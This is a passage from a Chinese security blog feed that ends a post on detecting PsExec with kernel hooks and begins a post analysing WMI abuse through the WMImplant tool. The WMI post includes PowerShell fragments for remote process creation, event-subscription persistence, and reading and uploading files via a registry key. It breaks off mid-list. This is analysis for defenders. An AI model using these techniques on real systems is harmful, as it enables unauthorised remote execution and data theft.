class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">typedef struct _RTL_USER_PROCESS_PARAMETERS</div><div class="line">&#123;</div><div class="line">ULONG MaximumLength<span class="comment">;</span></div><div class="line">ULONG Length<span class="comment">;</span></div><div class="line">ULONG Flags<span class="comment">;</span></div><div class="line">ULONG DebugFlags<span class="comment">;</span></div><div class="line">PVOID ConsoleHandle<span class="comment">;</span></div><div class="line">ULONG ConsoleFlags<span class="comment">;</span></div><div class="line">PVOID StandardInput<span class="comment">;</span></div><div class="line">PVOID StandardOutput<span class="comment">;</span></div><div class="line">PVOID StandardError<span class="comment">;</span></div><div class="line">CURDIR CurrentDirectory<span class="comment">;</span></div><div class="line">UNICODE_STRING DllPath<span class="comment">;</span></div><div class="line">UNICODE_STRING ImagePathName<span class="comment">;</span></div><div class="line">UNICODE_STRING CommandLine<span class="comment">;</span></div><div class="line">PVOID Environment<span class="comment">;</span></div><div class="line">ULONG StartingX<span class="comment">;</span></div><div class="line">ULONG StartingY<span class="comment">;</span></div><div class="line">ULONG CountX<span class="comment">;</span></div><div class="line">ULONG CountY<span class="comment">;</span></div><div class="line">ULONG CountCharsX<span class="comment">;</span></div><div class="line">ULONG CountCharsY<span class="comment">;</span></div><div class="line">ULONG FillAttribute<span class="comment">;</span></div><div class="line">ULONG WindowFlags<span class="comment">;</span></div><div class="line">ULONG <span class="keyword">ShowWindowFlags;</span></div><div class="line"><span class="keyword"></span>UNICODE_STRING WindowTitle<span class="comment">;</span></div><div class="line">UNICODE_STRING DesktopInfo<span class="comment">;</span></div><div class="line">UNICODE_STRING <span class="keyword">ShellInfo;</span></div><div class="line"><span class="keyword"></span>UNICODE_STRING RuntimeData<span class="comment">;</span></div><div class="line">RTL_DRIVE_LETTER_CURDIR CurrentDirectores[<span class="number">32</span>]<span class="comment">;</span></div><div class="line">ULONG EnvironmentSize<span class="comment">;</span></div><div class="line">&#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为，我需要对系统全局的进程创建进行Hook，所以我决定采用SSDT Hook来达成这一目的,最重要的原因是我之前写过类似的Demo，可以直接使用。当然，使用回调一样是可以解决问题的，关于SSDTHook原理和编程，网络上也有很多讲解。当Hook NtCreateUserProcess之后，继而检查ProcessParameters-&gt;StandardInput，ProcessParameters-&gt;StandardOutput，ProcessParameters-&gt;StandardError是否为空即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相对于PsExecSvc.exe，NtCreateUserProcess创建的进程是其子进程，所以PsExecSvc.exe算是NtCreateUserProcess创建的进程的父进程。NtCreateUserProcess函数原型如下,很显然，第一个参数是创建进程的ProcessHandle。所以，我们需要函数返回的ProcessHandle获取其父进程的进程数据(Pid或者Handle)<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NTAPI NtCreateUserProcess(</div><div class="line"><span class="keyword">OUT</span> PHANDLE ProcessHandle,</div><div class="line"><span class="keyword">OUT</span> PHANDLE ThreadHandle,</div><div class="line"><span class="keyword">IN</span> ACCESS_MASK ProcessDesiredAccess,</div><div class="line"><span class="keyword">IN</span> ACCESS_MASK ThreadDesiredAccess,</div><div class="line"><span class="keyword">IN</span> POBJECT_ATTRIBUTES ProcessObjectAttributes <span class="keyword">OPTIONAL</span>,</div><div class="line"><span class="keyword">IN</span> POBJECT_ATTRIBUTES ThreadObjectAttributes <span class="keyword">OPTIONAL</span>,</div><div class="line"><span class="keyword">IN</span> ULONG CreateProcessFlags,</div><div class="line"><span class="keyword">IN</span> ULONG CreateThreadFlags,</div><div class="line"><span class="keyword">IN</span> PRTL_USER_PROCESS_PARAMETERS ProcessParameters,</div><div class="line"><span class="keyword">IN</span> PVOID Parameter9,</div><div class="line"><span class="keyword">IN</span> PNT_PROC_THREAD_ATTRIBUTE_LIST AttributeList</div><div class="line">)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以通过 ZwQueryInformationProcess 获取父进程Pid，具体可以这样做。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PROCESS_BASIC_INFORMATION pbi<span class="comment">;</span></div><div class="line"></div><div class="line">UNICODE_STRING routineName<span class="comment">;</span></div><div class="line">RtlInitUnicodeString(&amp;routineName, L<span class="string">"ZwQueryInformationProcess"</span>)<span class="comment">;</span></div><div class="line">ZwQueryInformationProcess = (QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&amp;routineName)<span class="comment">;</span></div><div class="line">ntStatus = ZwQueryInformationProcess(*ProcessHandle, <span class="number">0</span>, (PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL)<span class="comment">;</span></div><div class="line">if (!ntStatus)</div><div class="line">&#123;</div><div class="line">upPid = pbi.InheritedFromUniqueProcessId<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来，就可以判断返回的Pid的进程是否是服务，这一步，网上也有现成的代码。具体来说，就是通过EnumServicesStatusEx函数获取整个服务列表的LPENUM_SERVICE_STATUS_PROCESS，而LPENUM_SERVICE_STATUS_PROCESS保存着对于进程的Pid。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> IsServicesByPid(DWORD dwPid)</div><div class="line">&#123;</div><div class="line">SC_HANDLE hSCM = <span class="literal">NULL</span>;</div><div class="line">hSCM = OpenSCManager(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);</div><div class="line"><span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] OpenSCManager:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD dwBufSize = <span class="number">0</span>;                <span class="comment">// 传入的缓冲长度</span></div><div class="line">DWORD dwBufNeed = <span class="number">0</span>;                <span class="comment">// 需要的缓冲长度</span></div><div class="line">DWORD dwNumberOfService = <span class="number">0</span>;        <span class="comment">// 返回的服务个数</span></div><div class="line">EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,</div><div class="line"><span class="literal">NULL</span>, dwBufSize, &amp;dwBufNeed, &amp;dwNumberOfService, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">char</span> *pBuf = <span class="literal">NULL</span>;</div><div class="line">dwBufSize = dwBufNeed + <span class="keyword">sizeof</span>(ENUM_SERVICE_STATUS_PROCESS);</div><div class="line">pBuf = (<span class="keyword">char</span> *)malloc(dwBufSize);</div><div class="line">memset(pBuf, <span class="number">0</span>, dwBufSize);</div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> bRet = <span class="literal">FALSE</span>;</div><div class="line">bRet = EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,</div><div class="line">(LPBYTE)pBuf, dwBufSize, &amp;dwBufNeed, &amp;dwNumberOfService, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (bRet == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">" EnumServicesStatusEx %d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">LPENUM_SERVICE_STATUS_PROCESS pServiceInfo = (LPENUM_SERVICE_STATUS_PROCESS)pBuf;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwNumberOfService; i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (dwPid == pServiceInfo[i].ServiceStatusProcess.dwProcessId)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]Find Service Name %s Of ProcessId"</span>, pServiceInfo[i].lpDisplayName);</div><div class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来，就是判断PsExecSvc.exe是否具有命名管道，命名管道实际上就是Type为”File”的句柄，所以，只需要遍历进程的句柄表，然后检查句柄类型为File，且句柄名称带有NamedPipe的，就是存在命名管道。可以使用Process Explorer来搜索命名管道。<br>    <img src="http://hacky.wang/blog/20210718/CGN9Yw6CHLow.png?imageslim" alt="mark"></p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//获取句柄名</span></div><div class="line">Status = ZwQueryObject((HANDLE)hDuplicate,</div><div class="line">ObjectNameInformation,</div><div class="line">BufferForObjectName,</div><div class="line">sizeof(BufferForObjectName),</div><div class="line"><span class="keyword">NULL</span>);</div><div class="line"></div><div class="line">ObjectName = (POBJECT_NAME_INFORMATION)BufferForObjectName;</div><div class="line"><span class="keyword">if</span> (Status == STATUS_INFO_LENGTH_MISMATCH || !NT_SUCCESS(Status))</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">PWCHAR HandleType_File = L<span class="string">"File"</span>;</div><div class="line"><span class="keyword">CHAR</span> cObjectName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="keyword">if</span> (wcscmp((PWCHAR)ObjectType-&gt;TypeName.Buffer, HandleType_File) == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">wsprintfA(cObjectName, <span class="string">"%S"</span>, (PWCHAR)ObjectName-&gt;Name.Buffer);</div><div class="line"><span class="keyword">if</span> (strstr(cObjectName, <span class="string">"\\Device\\NamedPipe"</span>))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]Type:%ls|Name:%ls|Handle:%X\n"</span>, ObjectType-&gt;TypeName.Buffer, ObjectName-&gt;Name.Buffer, (DWORD)dwHandle);</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只需要将获取的Pid传到R3，然后检查服务和命名管道符合这三个维度就可以基本判断其可能是PsExec类似软件。<br>     <img src="http://hacky.wang/blog/20210718/qR7Vz1t6fHlR.jpg?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210718/mfe3BtJLzqCl.jpg?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210718/P3Hz7Bu2vf9J.jpg?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-前言&quot;&gt;&lt;a href=&quot;#0x1-前言&quot; class=&quot;headerlink&quot; title=&quot;0x1 前言&quot;&gt;&lt;/a&gt;0x1 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本文主要通过逆向分析的方法分析PsExec的技术实现和有关PsExec和类PsExec工具的检测方法，当然其中也会掺杂一些乱七八糟的点，都是学习PsExec的一些总结。本文行文仓促，如有错误，请各位积极指正。&lt;/p&gt;
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="https://findream.github.io/categories/ATT-CK/"/>
    
    
  </entry>
  
  <entry>
    <title>WMI的攻守之道</title>
    <link href="https://findream.github.io/2021/11/13/WMI%E6%94%BB%E5%AE%88%E4%B9%8B%E9%81%93/"/>
    <id>https://findream.github.io/2021/11/13/WMI攻守之道/</id>
    <published>2021-11-13T07:02:11.000Z</published>
    <updated>2022-09-14T13:16:03.750Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文转载于跳跳糖安全社区，原文链接为<a href="https://tttang.com/archive/1624/" target="_blank" rel="external">https://tttang.com/archive/1624/</a></li></ul><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows Management Instrumentation(Windows 管理规范) 即WMI，是微软实现的基于Web的企业管理(WBEM)。WMI使用通用信息模型(CIM)来表示系统、应用程序、网络、设备和其他托管组件。WMI支持本地和远程访问。WMI底层基于分布式组件对象模型(DCOM)或者Windows远程管理(WinRM)。程序员们可以使用脚本语言(例如powershell)，或者C++，通过COM技术与WMI进行交互。本文行文仓促，如有错误，请各位积极指正。</p><h2 id="0x01-WMI滥用情况"><a href="#0x01-WMI滥用情况" class="headerlink" title="0x01 WMI滥用情况"></a>0x01 WMI滥用情况</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于WMI的特殊性，WMI可以被广泛的滥用于MITER ATT&amp;CK矩阵中，包括执行，持久化，防御逃避，侦查，横向移动，命令控制。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[执行]战术中，ATT&amp;CK专门安排了一个技术点专门介绍Windows行为规范T1047。WMI可以通过命令和脚本解释器powershell（T1059.001）进行交互，并且其通信是基于对象组件模型(T1559.001)。并且可以通过Win32_ScheduledJob类创建计划任务(T1053),但这已经不能在Win7以上系统中使用了。<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_ScheduledJob</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[持久化]战术中，可以通过WMI事件订阅(T1546.003)安装筛选器和事件消费者实现持久化。WMI具有远程连接的能力，即外部远程服务(T1133)。并且可以通过注册表在Run键下面创建启动项(T1547.001)<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Set</span>-WmiInstance -Namespace root\subscription -<span class="keyword">Class</span> __FilterToConsumerBinding -Arguments <span class="built_in">$FilterToConsumerArgs</span></div><div class="line">Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">Class</span> StdRegProv -Name CreateKey</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[防御逃避]中，可以利用WMI通过修改注册表(T1112)的方式禁用或修改工具(T1562.001)，也可以通过Win32_Process类间接创建进程，通过WMI创建的进行其父进程应该为WMI提供者进程(T1202)。<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Invoke-WmiMethod -<span class="keyword">Class</span> Win32_Process -EnableAllPrivileges -Impersonation <span class="number">3</span> -Authentication Packetprivacy -<span class="keyword">Name</span> Create</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在[侦查]中，可以获取系统各方面的信息，可以利用Win32_UserAccount,Win32_LoggedOnUser获取账户信息(T1087)。使用Win32_Directory类获取文件信息(T1083)。使用Win32_Process类获取进程信息(T1057),使用Win32_OperatingSystem，Win32_SystemResourcesetc类进行系统信息侦查(T1082)等等<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_UserAccount</span></span></div><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_Process</span></span></div><div class="line">Get-WmiObject -<span class="class"><span class="keyword">class</span> <span class="title">Win32_Service</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI主要通过Win_Process进行远程命令执行。</p><h2 id="0x02-WMI的工作原理"><a href="#0x02-WMI的工作原理" class="headerlink" title="0x02 WMI的工作原理"></a>0x02 WMI的工作原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据windows在<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture" target="_blank" rel="external">WMI 架构</a>知识文档中所述，WMI架构主要包括3个部分，WMI消费者，WMI基础架构，WMI提供者和托管对象。<br>    <img src="http://hacky.wang/blog/20211113/P0UyPjN9vcbt.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI提供者(WMI Provider)是一个COM对象，负责管理和监视托管对象，向托管对象处发起请求，并其中获取数据，并将数据提供给WMI基础架构。所以称之为提供者(Provider)。托管对象是一个逻辑或者物理的组件，例如进程，操作系统，服务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI基础架构(WMI infrastructure)是一个Windows系统组件，称为WMI服务(winmgnt),WMI基础结构有两个组件：CIM对象管理器和WMI存储库。WMI存储库存储着一些静态数据。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI消费者是和WMI基础架构进行交互的管理程序或者脚本。WMI消费者通过相关的COM API或者脚本API与WMI基础架构进行交互，用来查询，枚举数据，运行管理程序方法或订阅事件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简单概括WMI工作原理就是WMI消费者通过统一的API接口与WMI基础架构进行交互，由WMI基础架构充当WMI消费者，和WMI提供者，WMI存储库之间的中介。如果需要获取的是静态数据，则直接从存储库获取，如果是动态数据，则可以通过WMI提供者获取数据。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI既可以执行本地操作，也可以执行远程操作，这也是攻击者喜欢使用WMI的原因之一，WMI主要支持两种协议，DCOM和WinRM。最开始DCOM协议是WMI使用的默认协议，DCOM又称分布式组件对象模型，其通过135端口建立连接。而后续的WMI中，微软推荐使用WinRM协议进行通信。本次，本文主要通过powershell描述WMI攻击方式。所以重点也将关注DCOM协议。因为powershell内置的WMI命令是使用DCOM协议。</p><h2 id="0x03-WMI攻击"><a href="#0x03-WMI攻击" class="headerlink" title="0x03 WMI攻击"></a>0x03 WMI攻击</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows提供了多种和WMI进行交互的方式，例如通过powershell或者VBScript等脚本语言进行交互，比如利用c++通过COM API进行交互，利用C#，通过System.Management命名空间下的几个类和WMI进行交互，除此以外，还有几款成熟的工具用来和WMI进行交互，例如wmic.exe。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文将以WMImplant为例，介绍WMI攻击的原理。WMImplant是一个基于PowerShell的工具，它利用WMI来对目标机器执行操作，而且还作为C2通道来发出命令和接收结果。WMImplant的主要功能有文件操作，横向移动，进程操作，系统操作，以及日志操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PowerShell有很多和WMI交互的函数，WMImplant使用的函数主要有如下几个函数。当然，WMImplant使用这些WMI函数，并没有使用CIM函数，因为函数命令是基于低版本的Powershell，而CIM函数只能用于V3以上的版本，但是CIM函数能支持DCOM协议和WinRM协议，而WMI函数只支持DCOM协议。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Get-WmiObject</span></div><div class="line"><span class="built_in">Set-WmiInstance</span></div><div class="line"><span class="built_in">Invoke-WmiMethod</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMImplant用法很简单,只需要知道目标及其的ComputerName，以及管理员Credential。使用<code>Import-Module .\WMImplant.ps1</code>和<code>Invoke-WMImplant</code>两条命令启动WMImplant。<br>   <img src="http://hacky.wang/blog/20211114/Fb2RO4pHdxuJ.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后使用<code>change_user</code>命令设置domain/user和password。<br>   <img src="http://hacky.wang/blog/20211114/XHHNo9dOvt29.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMImplant的文件操作主要有一下操作，其中，经常使用的有<code>cat</code>命令,<code>download</code>命令,<code>ls</code>命令,<code>upload</code>命令。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat                                 -   Reads <span class="keyword">the</span> contents <span class="keyword">of</span> <span class="keyword">a</span> <span class="built_in">file</span></div><div class="line">copy                                -   Copies <span class="keyword">a</span> <span class="built_in">file</span> <span class="built_in">from</span> <span class="literal">one</span> location <span class="built_in">to</span> another</div><div class="line">download                            -   Download <span class="keyword">a</span> <span class="built_in">file</span> <span class="built_in">from</span> <span class="keyword">the</span> targeted machine</div><div class="line">ls                                  -   File/Directory listing <span class="keyword">of</span> <span class="keyword">a</span> specific <span class="built_in">directory</span></div><div class="line">search                              -   Search <span class="keyword">for</span> <span class="keyword">a</span> <span class="built_in">file</span> <span class="keyword">on</span> <span class="title">a</span> <span class="title">user-specified</span> <span class="title">drive</span></div><div class="line">upload                              -   Upload <span class="keyword">a</span> <span class="built_in">file</span> <span class="built_in">to</span> <span class="keyword">the</span> targeted machine</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ls命令的主要作用是列举指定目录下的目录和文件，依次指定指定的ComputerName和目录。其基本原理是从Win32_Directory类中获取目录的信息。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">filter = <span class="string">"Drive='<span class="variable">$Drive</span>' and Path='<span class="variable">$DirPath</span>'"</span></span></div><div class="line"><span class="meta">$</span><span class="bash">a= Get-WmiObject -Class Win32_Directory -Filter <span class="variable">$filter</span></span></div></pre></td></tr></table></figure></p><p><img src="http://hacky.wang/blog/20211114/cJyxcHzGtCy5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而cat命令的作用是读取文件内容，但是WMI本身是不具有回显的功能，通常有两种情况解决WMI回显的问题，第一种是将回显结果写入文件，然后通过SMB读取文件，但是因为使用了SMB协议，所以会额外多添加一个445端口。第二种方法是将回显结果写入注册表，然后通过WMI相关注册表操作函数读取注册表的内容，从而实现回显。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMImplant也是通过远程创建进程将结果写入注册表的方式实现回显，具体操作如下,首先利用StdRegProv类的CreateKey方法创建一个注册表项。<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$reg</span>_create =  Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">Class</span> StdRegProv -Name CreateKey -ArgumentList <span class="built_in">$HKCU</span>, <span class="built_in">$Item</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后构造一个远程命令,其主要目的是利用<code>Get-Content</code>函数读取文件内容，然后将其编码，之后利用<code>Set-ItemProperty</code>函数将其写入注册表中。<br><figure class="highlight nsis"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$remote_command</span> = <span class="string">'<span class="variable">$fct</span> = Get-Content -Encoding byte -Path '</span><span class="string">''</span> + <span class="string">"<span class="variable">$File</span>"</span> + <span class="string">''</span><span class="string">'; <span class="variable">$fctenc</span> = [Int[]][Char[]]<span class="variable">$fct</span> -Join '</span><span class="string">','</span><span class="string">'; Set-ItemProperty -Path HKCU:\SOFTWARE\EvilKey -Name Result  -Value <span class="variable">$fctenc</span>;'</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着调用<code>Invoke-WMIObfuscatedPSCommand</code>函数执行上述远程命令。Invoke-WMIObfuscatedPSCommand函数主要是基于利用Win32_Proces类的Create方法创建进程从而执行远程命令。<br>   <img src="http://hacky.wang/blog/20211114/A1xhca343OIb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后便是利用<code>StdRegProv</code>类的<code>GetStringValue</code>读取键的值。<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regvalue</span> = Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">class</span> StdRegProv -Name GetStringValue  -ArgumentList <span class="built_in">$HKCU</span>, <span class="built_in">$KeyPath</span>, <span class="built_in">$ResultKey</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>download</code>命令和<code>upload</code>命令的原理是一样的，都是借助注册表保存文件的内容。然后利用Set-Content函数将保存在注册表的内容写入文件。只是<code>download命令</code>是在本地执行Set-Content函数。而<code>upload</code>命令是在远程机器执行Set-Content函数。<br><figure class="highlight nsis"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//upload远程执行Set-Content函数</div><div class="line"><span class="variable">$remote_command</span> = <span class="string">'<span class="variable">$Hive</span> = 2147483650; <span class="variable">$key</span> = '</span><span class="string">''</span> + <span class="string">"<span class="variable">$regpath</span>'"</span> + <span class="string">'; <span class="variable">$value</span> = '</span><span class="string">''</span> + <span class="string">"<span class="variable">$registryupname</span>"</span> + <span class="string">''</span><span class="string">'; <span class="variable">$out</span> = Invoke-WmiMethod -Namespace '</span><span class="string">'root\default'</span><span class="string">' -Class '</span><span class="string">'StdRegProv'</span><span class="string">' -Name '</span><span class="string">'GetStringValue'</span><span class="string">' -ArgumentList <span class="variable">$Hive</span>, <span class="variable">$key</span>, <span class="variable">$value</span>; <span class="variable">$decode</span> = [byte[]][int[]]<span class="variable">$out</span>.sValue.Split('</span><span class="string">','</span><span class="string">') -Join '</span><span class="string">' '</span><span class="string">'; [byte[]] <span class="variable">$decoded</span> = <span class="variable">$decode</span> -split '</span><span class="string">' '</span><span class="string">'; Set-Content -Encoding byte -Path '</span> + <span class="string">"<span class="variable">$Upload_Dir</span>"</span> + <span class="string">' -Value <span class="variable">$decoded</span>; Remove-ItemProperty -Path '</span> + <span class="string">"'<span class="variable">$fullregistrypath</span>'"</span> + <span class="string">' -Name '</span> + <span class="string">"'<span class="variable">$registryupname</span>'"</span></div><div class="line">//download本地执行Set-Content函数</div><div class="line">Set-Content -Encoding byte -Path <span class="variable">$Download_file_path</span> -Value <span class="variable">$decoded</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据WMImplant的介绍，横向移动有如下命令,其中经常使用的是command_exec。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">command_exec                        -   